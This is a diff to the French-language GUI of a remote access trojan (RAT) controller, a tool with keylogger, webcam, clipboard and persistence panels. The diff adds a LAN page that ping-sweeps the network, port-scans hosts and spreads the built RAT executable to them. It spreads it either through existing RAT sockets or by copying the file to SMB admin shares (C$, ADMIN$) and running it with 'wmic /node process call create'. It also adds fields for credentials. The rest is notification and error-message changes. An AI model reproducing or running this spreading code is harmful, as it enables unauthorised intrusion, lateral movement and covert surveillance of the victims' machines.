@@ -60,12 +60,14 @@ except ImportError:
     REPORT_AVAILABLE = False
 
 try:
-    from network_scanner import scan_network, get_local_network
+    from network_scanner import scan_network, scan_ports, get_local_network, ping_host
     SCANNER_AVAILABLE = True
 except ImportError:
     SCANNER_AVAILABLE = False
     def scan_network(network_range=None, callback=None): return []
+    def scan_ports(target_ip, ports=None, callback=None): return []
     def get_local_network(): return ("192.168.1.0/24", "192.168.1.1")
+    def ping_host(ip): return False
 
 logging.basicConfig(
     level=logging.INFO,
@@ -188,6 +190,7 @@ class RATServerGUI:
         self._setup_keylogger(self._content_frames["keylogger"])
         self._setup_clipboard(self._content_frames["clipboard"])
         self._setup_files(self._content_frames["files"])
+        self._setup_lan(self._content_frames["lan"])
         self._setup_scanner(self._content_frames["scanner"])
         self._setup_persistence(self._content_frames["persistence"])
         self._setup_sysinfo(self._content_frames["sysinfo"])
@@ -253,6 +256,7 @@ class RATServerGUI:
                 ("files",       "\U0001f4c2", "Transfert"),
             ]),
             ("RÉSEAU & SYSTÈME", [
+                ("lan",         "\U0001f5a7", "Réseau LAN"),
                 ("scanner",     "\U0001f310", "Scanner réseau"),
                 ("persistence", "\U0001f512", "Persistance"),
                 ("sysinfo",     "\U0001f4bb", "Info système"),
@@ -305,18 +309,23 @@ class RATServerGUI:
     def _build_content_area(self, parent):
         content_outer = tk.Frame(parent, bg=self.bg_main)
         content_outer.pack(side="left", fill="both", expand=True)
-        self._notif_zone = tk.Frame(content_outer, bg=self.bg_main)
-        self._notif_zone.pack(fill="x", padx=10, pady=(6, 0))
+        # Legacy notif_zone kept but hidden — toasts replace it
+        self._notif_zone = tk.Frame(content_outer, bg=self.bg_main, height=0)
+        self._notif_zone.pack(fill="x")
         self._content_stack = tk.Frame(content_outer, bg=self.bg_main)
         self._content_stack.pack(fill="both", expand=True, padx=10, pady=6)
         slugs = ["dashboard", "terminal", "clients", "stream", "screenshots",
-                 "webcam", "keylogger", "clipboard", "files", "scanner",
+                 "webcam", "keylogger", "clipboard", "files", "lan", "scanner",
                  "persistence", "sysinfo", "settings", "defense", "report", "help"]
         for slug in slugs:
             f = tk.Frame(self._content_stack, bg=self.bg_main)
             f.place(relwidth=1, relheight=1)
             f.lower()
             self._content_frames[slug] = f
+        # Toast overlay state — keyed by page slug
+        self._toasts = {}   # slug -> list of toast frames currently visible
+        # Restack on resize so toasts stay anchored to bottom-right
+        self._content_stack.bind("<Configure>", self._on_content_resize)
 
     def _show_section(self, slug):
         if self._active_section and self._active_section in self._sidebar_buttons:
@@ -672,6 +681,441 @@ class RATServerGUI:
         self.clipboard_text = self._make_text_area(parent, readonly=False)
 
     # ═══════════════════════════════════════════════════════════════════
+    # LAN HOSTS PAGE
+    # ═══════════════════════════════════════════════════════════════════
+
+    def _setup_lan(self, parent):
+        parent.configure(bg=self.bg_main)
+        self._section_header(parent, "Réseau LAN", "Machines sur le même réseau — scan, déploiement et connexion")
+
+        # ── toolbar ──────────────────────────────────────────────────────
+        toolbar = tk.Frame(parent, bg=self.bg_main)
+        toolbar.pack(fill="x", pady=(0, 8))
+
+        net_range, _ = get_local_network()
+        self._lan_net_var = tk.StringVar(value=net_range)
+        ttk.Entry(toolbar, textvariable=self._lan_net_var, width=18,
+                  font=("Consolas", 9)).pack(side="left", padx=(0, 6))
+
+        self._lan_scan_btn = ttk.Button(toolbar, text="Scanner le réseau",
+                                        command=self._lan_do_scan)
+        self._lan_scan_btn.pack(side="left")
+
+        self._lan_status_lbl = tk.Label(toolbar, text="", fg=self.text_muted,
+                                        bg=self.bg_main, font=("Segoe UI", 8))
+        self._lan_status_lbl.pack(side="left", padx=10)
+
+        ttk.Button(toolbar, text="Actualiser statuts RAT",
+                   command=self._lan_refresh_rat_status).pack(side="right")
+
+        # ── progress bar ─────────────────────────────────────────────────
+        self._lan_progress = ttk.Progressbar(parent, mode="indeterminate",
+                                             style="Build.Horizontal.TProgressbar")
+
+        # ── column headers ───────────────────────────────────────────────
+        hdr = tk.Frame(parent, bg=self.bg_sidebar)
+        hdr.pack(fill="x")
+        cols = [("IP",         120), ("Hostname",   180), ("Ports ouverts", 220),
+                ("Statut RAT", 110), ("Actions",     260)]
+        for col_text, col_w in cols:
+            tk.Label(hdr, text=col_text, fg=self.text_muted, bg=self.bg_sidebar,
+                     font=("Segoe UI", 8, "bold"), width=col_w // 7,
+                     anchor="w", padx=6, pady=4).pack(side="left")
+
+        # ── scrollable host table ─────────────────────────────────────────
+        outer = tk.Frame(parent, bg=self.bg_main,
+                         highlightbackground=self.border_color, highlightthickness=1)
+        outer.pack(fill="both", expand=True, pady=(0, 4))
+
+        self._lan_canvas = tk.Canvas(outer, bg=self.bg_main, highlightthickness=0)
+        vsb = tk.Scrollbar(outer, orient="vertical", command=self._lan_canvas.yview,
+                           bg=self.bg_sidebar, troughcolor=self.bg_main)
+        vsb.pack(side="right", fill="y")
+        self._lan_canvas.pack(fill="both", expand=True)
+        self._lan_canvas.configure(yscrollcommand=vsb.set)
+
+        self._lan_table = tk.Frame(self._lan_canvas, bg=self.bg_main)
+        self._lan_table_win = self._lan_canvas.create_window(
+            (0, 0), window=self._lan_table, anchor="nw")
+        self._lan_table.bind("<Configure>",
+            lambda e: self._lan_canvas.configure(
+                scrollregion=self._lan_canvas.bbox("all")))
+        self._lan_canvas.bind("<Configure>",
+            lambda e: self._lan_canvas.itemconfig(
+                self._lan_table_win, width=e.width))
+        self._lan_canvas.bind_all("<MouseWheel>",
+            lambda e: self._lan_canvas.yview_scroll(-1*(e.delta//120), "units"))
+
+        # Empty state
+        self._lan_empty_lbl = tk.Label(
+            self._lan_table,
+            text="Lance un scan pour voir les machines du réseau",
+            fg=self.text_muted, bg=self.bg_main, font=("Segoe UI", 9))
+        self._lan_empty_lbl.pack(pady=40)
+
+        # Internal state
+        self._lan_hosts = []      # [(ip, hostname, ports_open)]
+        self._lan_row_frames = {} # ip -> row_frame
+
+    def _lan_do_scan(self):
+        self._lan_scan_btn.config(state="disabled", text="Scan en cours…")
+        self._lan_status_lbl.config(text="")
+        self._lan_progress.pack(fill="x", pady=(0, 4))
+        self._lan_progress.start(10)
+        self._lan_hosts.clear()
+        for w in self._lan_table.winfo_children():
+            w.destroy()
+        self._lan_row_frames.clear()
+        self._lan_status_lbl.config(text="Ping sweep…")
+        self._lan_found_count = 0
+        self._lan_total_ips = 0
+        self._lan_ping_done = False
+
+        KEY_PORTS = [22, 80, 135, 139, 443, 445, 3389, 5900, 8080]
+
+        def on_host_found(ip, hostname):
+            """Called from background thread as soon as a host replies to ping."""
+            self._lan_found_count += 1
+            # 1. Add the row immediately with "scanning…" for ports
+            self.root.after(0, lambda i=ip, h=hostname: self._lan_add_row_stub(i, h))
+            # 2. Start port scan for this host in its own thread
+            def port_scan_then_update():
+                results = scan_ports(ip, ports=KEY_PORTS)
+                open_ports = [(p, s) for p, s, o in results if o]
+                self.root.after(0, lambda i=ip, op=open_ports: self._lan_update_ports(i, op))
+            threading.Thread(target=port_scan_then_update, daemon=True).start()
+
+        def on_progress(scanned, total):
+            self.root.after(0, lambda s=scanned, t=total: self._lan_status_lbl.config(
+                text=f"Ping {s}/{t}  —  {self._lan_found_count} hôte(s) trouvé(s)"))
+
+        def run():
+            try:
+                import ipaddress as _ipa
+                network = _ipa.ip_network(self._lan_net_var.get(), strict=False)
+                all_ips = list(network.hosts())
+            except ValueError:
+                self.root.after(0, lambda: self._lan_scan_done(0))
+                return
+
+            self._lan_total_ips = len(all_ips)
+            scanned_count = [0]
+            lock = threading.Lock()
+
+            def check_one(ip):
+                alive = ping_host(ip)
+                with lock:
+                    scanned_count[0] += 1
+                    n = scanned_count[0]
+                on_progress(n, self._lan_total_ips)
+                if alive:
+                    try:
+                        hostname = socket.gethostbyaddr(str(ip))[0]
+                    except Exception:
+                        hostname = "Unknown"
+                    on_host_found(str(ip), hostname)
+
+            from concurrent.futures import ThreadPoolExecutor, as_completed
+            with ThreadPoolExecutor(max_workers=80) as ex:
+                futs = [ex.submit(check_one, ip) for ip in all_ips]
+                for f in as_completed(futs):
+                    pass  # results handled via callbacks above
+
+            self.root.after(0, lambda: self._lan_scan_done(self._lan_found_count))
+
+        threading.Thread(target=run, daemon=True).start()
+
+    def _lan_scan_done(self, count):
+        self._lan_progress.stop()
+        self._lan_progress.pack_forget()
+        self._lan_scan_btn.config(state="normal", text="Scanner le réseau")
+        self._lan_status_lbl.config(
+            text=f"Terminé — {count} hôte(s) trouvé(s)",
+            fg=self.success_color if count else self.text_muted)
+        if count == 0:
+            tk.Label(self._lan_table,
+                     text="Aucun hôte trouvé sur ce réseau",
+                     fg=self.text_muted, bg=self.bg_main,
+                     font=("Segoe UI", 9)).pack(pady=40)
+
+    def _lan_add_row_stub(self, ip, hostname):
+        """Add a row immediately when host is found — ports show '…' until scanned."""
+        if ip in self._lan_row_frames:
+            return  # already added (race-guard)
+        self._lan_hosts.append((ip, hostname, []))
+
+        idx = len(self._lan_row_frames)
+        row_bg = self.bg_card if idx % 2 == 0 else self.bg_main
+
+        row = tk.Frame(self._lan_table, bg=row_bg,
+                       highlightbackground=self.border_color, highlightthickness=1)
+        row.pack(fill="x", pady=1)
+        self._lan_row_frames[ip] = row
+
+        # ── IP ──────────────────────────────────────────────────────────
+        tk.Label(row, text=ip, fg=self.accent_color, bg=row_bg,
+                 font=("Consolas", 9), width=17, anchor="w",
+                 padx=6).pack(side="left")
+
+        # ── Hostname ────────────────────────────────────────────────────
+        short_host = hostname[:24] if len(hostname) > 24 else hostname
+        tk.Label(row, text=short_host, fg=self.text_color, bg=row_bg,
+                 font=("Segoe UI", 9), width=22, anchor="w").pack(side="left")
+
+        # ── Ports (placeholder) ─────────────────────────────────────────
+        ports_lbl = tk.Label(row, text="scan…", fg=self.text_muted, bg=row_bg,
+                             font=("Consolas", 8), width=32, anchor="w")
+        ports_lbl.pack(side="left")
+        row._ports_lbl = ports_lbl  # store ref for later update
+
+        # ── RAT status ─────────────────────────────────────────────────
+        rat_lbl = tk.Label(row, text="", fg=self.text_muted, bg=row_bg,
+                           font=("Segoe UI", 8), width=13, anchor="w")
+        rat_lbl.pack(side="left")
+        self._lan_update_rat_badge(ip, rat_lbl, row_bg)
+        row._rat_lbl = rat_lbl
+
+        # ── Actions column ─────────────────────────────────────────────
+        acts = tk.Frame(row, bg=row_bg)
+        acts.pack(side="left", padx=4)
+        row._acts = acts          # store so _lan_update_ports can add RDP/VNC
+
+        deploy_btn = tk.Button(
+            acts, text="⬆ Déployer",
+            fg=self.bg_main, bg=self.accent_color,
+            activebackground=self.success_color, activeforeground=self.bg_main,
+            relief="flat", font=("Segoe UI", 8), padx=6, pady=2, bd=0,
+            cursor="hand2",
+            command=lambda i=ip: self._lan_deploy(i, deploy_btn))
+        deploy_btn.pack(side="left", padx=2)
+
+        sel_btn = tk.Button(
+            acts, text="⚡ Sélectionner",
+            fg=self.text_muted, bg=self.bg_input,
+            activebackground=self.bg_card, activeforeground=self.text_color,
+            relief="flat", font=("Segoe UI", 8), padx=6, pady=2, bd=0,
+            cursor="hand2",
+            command=lambda i=ip: self._lan_select_client(i, sel_btn))
+        sel_btn.pack(side="left", padx=2)
+
+        tk.Button(
+            acts, text="🔍",
+            fg=self.text_muted, bg=row_bg,
+            activebackground=self.bg_input, activeforeground=self.text_color,
+            relief="flat", font=("Segoe UI", 9), padx=4, pady=2, bd=0,
+            cursor="hand2",
+            command=lambda i=ip, h=hostname: self._lan_show_ports(i, h)
+        ).pack(side="left", padx=2)
+
+    def _lan_update_ports(self, ip, open_ports):
+        """Called from main thread once port scan completes for one host."""
+        row = self._lan_row_frames.get(ip)
+        if row is None or not row.winfo_exists():
+            return
+        row_bg = row.cget("bg")
+
+        # Update ports label
+        if hasattr(row, "_ports_lbl") and row._ports_lbl.winfo_exists():
+            ports_text = "  ".join(f"{p}/{s}" for p, s in open_ports) if open_ports else "—"
+            if len(ports_text) > 30:
+                ports_text = ports_text[:28] + "…"
+            row._ports_lbl.config(text=ports_text, fg=self.success_color if open_ports else self.text_muted)
+
+        # Update _lan_hosts entry
+        for i, (h_ip, h_name, _) in enumerate(self._lan_hosts):
+            if h_ip == ip:
+                self._lan_hosts[i] = (h_ip, h_name, open_ports)
+                break
+
+        # Dynamically add RDP / VNC buttons into the actions frame
+        if hasattr(row, "_acts") and row._acts.winfo_exists():
+            acts = row._acts
+            has_rdp = any(p == 3389 for p, _ in open_ports)
+            has_vnc = any(p == 5900 for p, _ in open_ports)
+            if has_rdp and not hasattr(row, "_rdp_btn"):
+                row._rdp_btn = tk.Button(
+                    acts, text="🖥 RDP",
+                    fg=self.bg_main, bg="#5e81ac",
+                    activebackground="#81a1c1", activeforeground=self.bg_main,
+                    relief="flat", font=("Segoe UI", 8), padx=6, pady=2, bd=0,
+                    cursor="hand2",
+                    command=lambda i=ip: self._lan_open_rdp(i))
+                row._rdp_btn.pack(side="left", padx=2)
+            if has_vnc and not hasattr(row, "_vnc_btn"):
+                row._vnc_btn = tk.Button(
+                    acts, text="📡 VNC",
+                    fg=self.bg_main, bg="#b48ead",
+                    activebackground="#c896c8", activeforeground=self.bg_main,
+                    relief="flat", font=("Segoe UI", 8), padx=6, pady=2, bd=0,
+                    cursor="hand2",
+                    command=lambda i=ip: self._lan_open_vnc(i))
+                row._vnc_btn.pack(side="left", padx=2)
+
+    def _lan_update_rat_badge(self, ip, label, bg):
+        with self.lock:
+            rat_ips = [c["address"][0] for c in self.clients.values()]
+        if ip in rat_ips:
+            label.config(text="● CONNECTÉ", fg=self.success_color, bg=bg)
+        else:
+            label.config(text="○ Non connecté", fg=self.text_muted, bg=bg)
+
+    def _lan_refresh_rat_status(self):
+        """Refresh RAT badge on every row without re-scanning."""
+        for ip, row in self._lan_row_frames.items():
+            for w in row.winfo_children():
+                if isinstance(w, tk.Label) and w.cget("width") == 13:
+                    row_bg = row.cget("bg")
+                    self._lan_update_rat_badge(ip, w, row_bg)
+
+    def _lan_deploy(self, ip, btn):
+        """Deploy last built exe to a LAN host."""
+        exe = self._last_built_exe
+        if not exe or not os.path.isfile(exe):
+            self.log_message("Aucun exe — build d'abord dans Paramètres", "warning"); return
+
+        btn.config(state="disabled", text="…")
+
+        def run():
+            # Reuse the same deploy logic from the deploy panel
+            with self.lock:
+                rat_connected = any(c["address"][0] == ip for c in self.clients.values())
+
+            if rat_connected:
+                # Via existing RAT socket
+                with self.lock:
+                    entry = next((c for c in self.clients.values()
+                                  if c["address"][0] == ip), None)
+                if entry:
+                    sock, key = entry["socket"], entry.get("key")
+                    filename = os.path.basename(exe)
+                    remote_dest = f"%TEMP%\\{filename}"
+                    try:
+                        with open(exe, "rb") as f:
+                            data = f.read()
+                        send_msg(sock, f"upload {remote_dest}", key)
+                        send_msg(sock, data, key)
+                        ack = recv_msg_str(sock, key)
+                        if ack and "[+]" in ack:
+                            send_msg(sock, f"exec_bg {remote_dest}", key)
+                            recv_msg_str(sock, key)
+                            ok, msg = True, f"Déployé via RAT sur {ip}"
+                        else:
+                            ok, msg = False, f"Upload RAT échoué : {ack}"
+                    except Exception as e:
+                        ok, msg = False, str(e)
+                else:
+                    ok, msg = False, "Client RAT introuvable"
+            else:
+                # SMB + remote exec (no credentials = try anonymous admin share)
+                filename = os.path.basename(exe)
+                shares = [
+                    (f"\\\\{ip}\\C$\\Users\\Public\\{filename}", f"C:\\Users\\Public\\{filename}"),
+                    (f"\\\\{ip}\\ADMIN$\\Temp\\{filename}",      f"C:\\Windows\\Temp\\{filename}"),
+                ]
+                copied_local = None
+                for unc, local in shares:
+                    try:
+                        shutil.copy2(exe, unc)
+                        copied_local = local; break
+                    except Exception:
+                        pass
+                if copied_local:
+                    cmd = f'wmic /node:"{ip}" process call create "{copied_local}"'
+                    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+                    if r.returncode == 0 and "ReturnValue = 0" in r.stdout:
+                        ok, msg = True, f"Copié + lancé via wmic sur {ip}"
+                    else:
+                        ok, msg = False, f"Copié sur {ip} mais wmic refusé (droits admin ?)"
+                else:
+                    ok, msg = False, (f"SMB inaccessible sur {ip} — "
+                                      f"utilise le panel Déployer dans Paramètres pour fournir des identifiants")
+
+            level = "success" if ok else "warning"
+            self.root.after(0, lambda: (
+                btn.config(state="normal", text="⬆ Déployer"),
+                self.log_message(msg, level),
+                self._lan_refresh_rat_status()
+            ))
+
+        threading.Thread(target=run, daemon=True).start()
+
+    def _lan_select_client(self, ip, btn):
+        """Select an already-connected RAT client from this IP as active."""
+        with self.lock:
+            cid = next((cid for cid, c in self.clients.items()
+                        if c["address"][0] == ip), None)
+        if cid is None:
+            self.log_message(f"Aucun client RAT connecté depuis {ip}", "warning"); return
+        self.current_client_id = cid
+        with self.lock:
+            info = self.clients[cid].get("info", ip)
+        self.log_message(f"Client sélectionné : {ip} ({info})", "success")
+        btn.config(text="✓ Sélectionné")
+        self.root.after(2000, lambda: btn.config(text="⚡ Sélectionner"))
+
+    def _lan_open_rdp(self, ip):
+        """Launch MSTSC (RDP) to target IP."""
+        try:
+            if platform.system() == "Windows":
+                subprocess.Popen(["mstsc", f"/v:{ip}"])
+            else:
+                subprocess.Popen(["rdesktop", ip])
+            self.log_message(f"RDP lancé vers {ip}", "info")
+        except Exception as e:
+            self.log_message(f"Impossible de lancer RDP : {e}", "error")
+
+    def _lan_open_vnc(self, ip):
+        """Launch VNC viewer to target IP."""
+        viewers = ["vncviewer", "tigervnc", "realvnc-vncviewer"]
+        launched = False
+        for v in viewers:
+            try:
+                subprocess.Popen([v, ip])
+                self.log_message(f"VNC lancé vers {ip} ({v})", "info")
+                launched = True; break
+            except FileNotFoundError:
+                continue
+        if not launched:
+            self.log_message(
+                f"Aucun viewer VNC trouvé — installe TigerVNC ou RealVNC. Port 5900 ouvert sur {ip}",
+                "warning")
+
+    def _lan_show_ports(self, ip, hostname):
+        """Show a detailed port scan popup for one host."""
+        win = tk.Toplevel(self.root)
+        win.title(f"Ports — {ip}")
+        win.geometry("420x380")
+        win.configure(bg=self.bg_main)
+        win.resizable(False, True)
+
+        tk.Label(win, text=f"{ip}  ({hostname})", fg=self.accent_color,
+                 bg=self.bg_main, font=("Consolas", 10, "bold")).pack(pady=(12, 4))
+        tk.Label(win, text="Scan des ports en cours…", fg=self.text_muted,
+                 bg=self.bg_main, font=("Segoe UI", 8)).pack()
+
+        txt = tk.Text(win, bg=self.bg_console, fg=self.text_color,
+                      font=("Consolas", 9), relief="flat", padx=8, pady=8,
+                      state="disabled")
+        txt.pack(fill="both", expand=True, padx=10, pady=8)
+
+        def run():
+            results = scan_ports(ip)
+            lines = []
+            for port, svc, open_ in results:
+                if open_:
+                    lines.append(f"  ✓  {port:<6}  {svc}")
+            if not lines:
+                lines = ["  Aucun port commun ouvert"]
+            self.root.after(0, lambda: (
+                txt.config(state="normal"),
+                txt.delete("1.0", "end"),
+                txt.insert("end", f"Ports ouverts sur {ip}:\n\n" + "\n".join(lines)),
+                txt.config(state="disabled")
+            ))
+
+        threading.Thread(target=run, daemon=True).start()
+
+    # ═══════════════════════════════════════════════════════════════════
     # NETWORK SCANNER
     # ═══════════════════════════════════════════════════════════════════
 
@@ -946,78 +1390,140 @@ DÉMARRAGE RAPIDE:
             self.console.config(state="disabled")
         except Exception:
             pass
-        if level in ("error", "warning", "timeout") and (client_ip or cause or suggestion):
+        # Toast: always for error/warning/timeout/success ; info only if it has context
+        _skip_info = (level == "info" and not client_ip and not cause
+                      and not suggestion and len(msg) > 120)
+        if not _skip_info:
             self.show_notification(
                 level, msg, client_ip=client_ip, operation=operation,
                 cause=cause, suggestion=suggestion)
 
     def show_notification(self, level, title, client_ip=None, operation=None,
                            cause=None, suggestion=None):
-        colors = {
-            "error":   (self.error_color,   "#1a1e2e"),
-            "warning": (self.warning_color, "#1a1e2e"),
-            "timeout": (self.orange_color,  "#1a1e2e"),
-            "success": (self.success_color, "#1a1e2e"),
-            "info":    (self.info_color,    "#1a1e2e"),
-        }
-        icons = {"error": "✕", "warning": "⚠", "timeout": "⏱", "success": "✓", "info": "ℹ"}
-        border_clr, bg_clr = colors.get(level, colors["info"])
-        icon = icons.get(level, "ℹ")
+        # ── palette ──────────────────────────────────────────────────────
+        border_clr = {
+            "error":   self.error_color,
+            "warning": self.warning_color,
+            "timeout": self.orange_color,
+            "success": self.success_color,
+            "info":    self.info_color,
+        }.get(level, self.info_color)
+        bg_clr = "#1a1e2e"
+        icon   = {"error": "✕", "warning": "⚠", "timeout": "⏱",
+                  "success": "✓", "info": "ℹ"}.get(level, "ℹ")
         ts = time.strftime("%H:%M:%S")
-        notif = tk.Frame(self._notif_zone, bg=bg_clr,
-                         highlightbackground=border_clr, highlightthickness=1)
-        accent_bar = tk.Frame(notif, bg=border_clr, width=4)
-        accent_bar.pack(side="left", fill="y")
-        inner = tk.Frame(notif, bg=bg_clr)
-        inner.pack(side="left", fill="both", expand=True, padx=8, pady=6)
-        row1 = tk.Frame(inner, bg=bg_clr)
-        row1.pack(fill="x")
-        tk.Label(row1, text=icon, fg=border_clr, bg=bg_clr,
-                 font=("Segoe UI", 10)).pack(side="left")
-        tk.Label(row1, text=f" {title}", fg=border_clr, bg=bg_clr,
+
+        # ── pick parent: active page frame, or content_stack as fallback ─
+        slug   = self._active_section or "dashboard"
+        parent = self._content_frames.get(slug, self._content_stack)
+
+        # ── build toast ───────────────────────────────────────────────────
+        toast = tk.Frame(parent, bg=bg_clr,
+                         highlightbackground=border_clr, highlightthickness=2)
+
+        # Left accent bar
+        tk.Frame(toast, bg=border_clr, width=4).pack(side="left", fill="y")
+
+        inner = tk.Frame(toast, bg=bg_clr)
+        inner.pack(side="left", fill="both", expand=True, padx=10, pady=8)
+
+        # Row 1 — icon + title + time + close
+        r1 = tk.Frame(inner, bg=bg_clr)
+        r1.pack(fill="x")
+        tk.Label(r1, text=icon, fg=border_clr, bg=bg_clr,
+                 font=("Segoe UI", 11, "bold")).pack(side="left")
+        tk.Label(r1, text=f"  {title}", fg=border_clr, bg=bg_clr,
                  font=("Segoe UI", 9, "bold")).pack(side="left")
-        tk.Label(row1, text=f"  {ts}", fg=self.text_muted, bg=bg_clr,
+        tk.Label(r1, text=f"  {ts}", fg=self.text_muted, bg=bg_clr,
                  font=("Segoe UI", 8)).pack(side="left")
-        close_btn = tk.Label(row1, text="✕", fg=self.text_muted, bg=bg_clr,
-                              font=("Segoe UI", 9), cursor="hand2")
-        close_btn.pack(side="right")
-        close_btn.bind("<Button-1>", lambda e, n=notif: self._dismiss_notification(n))
+        close = tk.Label(r1, text=" ✕ ", fg=self.text_muted, bg=bg_clr,
+                         font=("Segoe UI", 9), cursor="hand2")
+        close.pack(side="right")
+        close.bind("<Button-1>", lambda e, t=toast: self._dismiss_toast(t, slug))
+        close.bind("<Enter>",    lambda e: close.config(fg=self.error_color))
+        close.bind("<Leave>",    lambda e: close.config(fg=self.text_muted))
+
+        # Row 2 — context (cause / client_ip)
         ctx_parts = []
-        if client_ip:  ctx_parts.append(f"Client: {client_ip}")
-        if operation:  ctx_parts.append(f"Opération: {operation}")
-        if cause:      ctx_parts.append(f"Cause: {cause}")
+        if client_ip: ctx_parts.append(f"Client: {client_ip}")
+        if cause:     ctx_parts.append(cause)
         if ctx_parts:
-            row2 = tk.Frame(inner, bg=bg_clr)
-            row2.pack(fill="x", pady=(2, 0))
-            tk.Label(row2, text="  " + "  ·  ".join(ctx_parts), fg=self.text_color,
-                     bg=bg_clr, font=("Segoe UI", 8), anchor="w").pack(side="left")
+            r2 = tk.Frame(inner, bg=bg_clr)
+            r2.pack(fill="x", pady=(3, 0))
+            tk.Label(r2, text="  " + "  ·  ".join(ctx_parts),
+                     fg=self.text_color, bg=bg_clr,
+                     font=("Segoe UI", 8), anchor="w",
+                     wraplength=340, justify="left").pack(side="left", fill="x")
+
+        # Row 3 — suggestion
         if suggestion:
-            row3 = tk.Frame(inner, bg=bg_clr)
-            row3.pack(fill="x", pady=(2, 0))
-            tk.Label(row3, text=f"  → {suggestion}", fg=self.accent_color,
-                     bg=bg_clr, font=("Segoe UI", 8), anchor="w").pack(side="left")
-        notif.pack(fill="x", pady=2)
-        self._notif_widgets.append(notif)
-        # Keep max 15 notifications — dismiss oldest if exceeded
-        if len(self._notif_widgets) > 15:
-            self._dismiss_notification(self._notif_widgets[0])
+            r3 = tk.Frame(inner, bg=bg_clr)
+            r3.pack(fill="x", pady=(2, 0))
+            tk.Label(r3, text=f"  → {suggestion}",
+                     fg=self.accent_color, bg=bg_clr,
+                     font=("Segoe UI", 8), anchor="w",
+                     wraplength=340, justify="left").pack(side="left", fill="x")
+
+        # ── position: bottom-right overlay, stack upwards ─────────────────
+        if slug not in self._toasts:
+            self._toasts[slug] = []
+        self._toasts[slug].append(toast)
+        self._restack_toasts(slug)
+
+        # ── alerts counter ────────────────────────────────────────────────
         if level in ("error", "warning", "timeout"):
             self._alert_count += 1
-            self._alert_badge.config(text=f"⚠ {self._alert_count} alerte{'s' if self._alert_count > 1 else ''}")
+            self._alert_badge.config(
+                text=f"⚠ {self._alert_count} alerte{'s' if self._alert_count > 1 else ''}")
             if hasattr(self, "_stat_alerts"):
                 self._stat_alerts.config(text=str(self._alert_count))
-            ts = time.strftime("%H:%M:%S")
-            self._alert_log.append((ts, msg, level))
-        if level in ("success", "info"):
-            self.root.after(30000, lambda: self._dismiss_notification(notif))
+            self._alert_log.append((ts, title, level))
 
-    def _dismiss_notification(self, notif):
+        # ── auto-dismiss ──────────────────────────────────────────────────
+        delay = 6000 if level in ("error", "warning", "timeout") else 4000
+        self.root.after(delay, lambda t=toast: self._dismiss_toast(t, slug))
+
+        # ── keep at most 5 toasts per page ───────────────────────────────
+        if len(self._toasts[slug]) > 5:
+            self._dismiss_toast(self._toasts[slug][0], slug)
+
+    def _restack_toasts(self, slug):
+        """Re-place all toasts for a page stacked from bottom-right upward."""
+        parent = self._content_frames.get(slug, self._content_stack)
+        parent.update_idletasks()
+        pw = parent.winfo_width()  or 800
+        ph = parent.winfo_height() or 600
+        TOAST_W   = 360
+        TOAST_GAP = 8
+        MARGIN_R  = 16
+        MARGIN_B  = 16
+        y = ph - MARGIN_B
+        for toast in reversed(self._toasts.get(slug, [])):
+            if not toast.winfo_exists():
+                continue
+            toast.update_idletasks()
+            th = toast.winfo_reqheight() or 70
+            y -= th
+            x = pw - TOAST_W - MARGIN_R
+            toast.place(x=x, y=y, width=TOAST_W)
+            toast.lift()
+            y -= TOAST_GAP
+
+    def _on_content_resize(self, event=None):
+        slug = self._active_section or "dashboard"
+        if self._toasts.get(slug):
+            self._restack_toasts(slug)
+
+    def _dismiss_toast(self, toast, slug):
         try:
-            notif.destroy()
-            if notif in self._notif_widgets:
-                self._notif_widgets.remove(notif)
+            if toast.winfo_exists():
+                toast.destroy()
         except Exception:
             pass
+        lst = self._toasts.get(slug, [])
+        if toast in lst:
+            lst.remove(toast)
+        self._restack_toasts(slug)
 
     def start_server(self):
         host, port = self.server_host.get(), self.server_port.get()
@@ -1635,14 +2141,22 @@ DÉMARRAGE RAPIDE:
                         self.webcam_images.append(img)
                         self.current_webcam_index = len(self.webcam_images) - 1
                         self.root.after(0, self._show_webcam)
-                        self.root.after(0, lambda: self.log_message("Webcam captured", "success"))
+                        self.root.after(0, lambda: self.log_message("Webcam capturée", "success"))
+                    elif data and not PIL_AVAILABLE:
+                        self.root.after(0, lambda: self.log_message(
+                            "Webcam reçue mais PIL absent sur le serveur", "warning"))
                 else:
-                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
-                    self.root.after(0, lambda: self.log_message(
+                    cid_snap = self.current_client_id
+                    cip = self.clients.get(cid_snap, {}).get("address", ("?",))[0] if cid_snap else "?"
+                    raw = (status or "").replace("FAIL:", "").replace("FAIL", "").strip()
+                    cause = raw if raw else "Aucune caméra détectée ou opencv absent"
+                    suggestion = ("pip install opencv-python sur le client cible"
+                                  if "opencv" in cause.lower() or not raw
+                                  else "Vérifier que la webcam est branchée et non utilisée par une autre application")
+                    self.root.after(0, lambda c=cause, s=suggestion, ci=cip: self.log_message(
                         "Webcam échouée", "error",
-                        client_ip=cip, operation="capture_webcam",
-                        cause="Réponse FAIL du client (opencv-python peut-être absent)",
-                        suggestion="pip install opencv-python sur le client cible"
+                        client_ip=ci, operation="capture_webcam",
+                        cause=c, suggestion=s
                     ))
 
             elif cmd == "stream_start":
@@ -2322,6 +2836,25 @@ DÉMARRAGE RAPIDE:
         tk.Label(info_row, text=os.path.basename(exe_path), fg=self.accent_color,
                  bg=self.bg_card, font=("Consolas", 9)).pack(side="left", padx=6)
 
+        # Credentials row (optional — for machines requiring explicit login)
+        cred_frame = tk.Frame(body, bg=self.bg_card)
+        cred_frame.pack(fill="x", pady=(0, 4))
+        tk.Label(cred_frame, text="Identifiants (optionnel) :", fg=self.text_muted,
+                 bg=self.bg_card, font=("Segoe UI", 8)).pack(side="left")
+        user_var = tk.StringVar()
+        pass_var = tk.StringVar()
+        tk.Label(cred_frame, text="Utilisateur", fg=self.text_muted,
+                 bg=self.bg_card, font=("Segoe UI", 8)).pack(side="left", padx=(8, 2))
+        ttk.Entry(cred_frame, textvariable=user_var, width=12,
+                  font=("Consolas", 8)).pack(side="left")
+        tk.Label(cred_frame, text="Mot de passe", fg=self.text_muted,
+                 bg=self.bg_card, font=("Segoe UI", 8)).pack(side="left", padx=(8, 2))
+        ttk.Entry(cred_frame, textvariable=pass_var, show="*", width=12,
+                  font=("Consolas", 8)).pack(side="left")
+        cred_hint = tk.Label(cred_frame, text="(laisse vide = compte courant)",
+                             fg=self.text_muted, bg=self.bg_card, font=("Segoe UI", 7))
+        cred_hint.pack(side="left", padx=8)
+
         # Scan controls
         scan_row = tk.Frame(body, bg=self.bg_card)
